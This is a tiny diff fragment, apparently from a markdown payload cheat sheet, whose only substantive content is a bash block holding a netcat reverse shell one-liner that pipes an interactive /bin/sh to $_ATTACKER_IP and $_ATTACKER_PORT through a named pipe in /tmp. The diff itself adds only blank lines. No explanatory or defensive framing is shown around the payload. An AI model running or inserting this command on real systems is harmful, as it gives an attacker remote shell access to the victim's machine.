@@ -14,3 +14,5 @@ updated_at: '2023-05-29T16:48:53.365139+00:00'
 ```bash
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $_ATTACKER_IP $_ATTACKER_PORT >/tmp/f
 ```
+
+
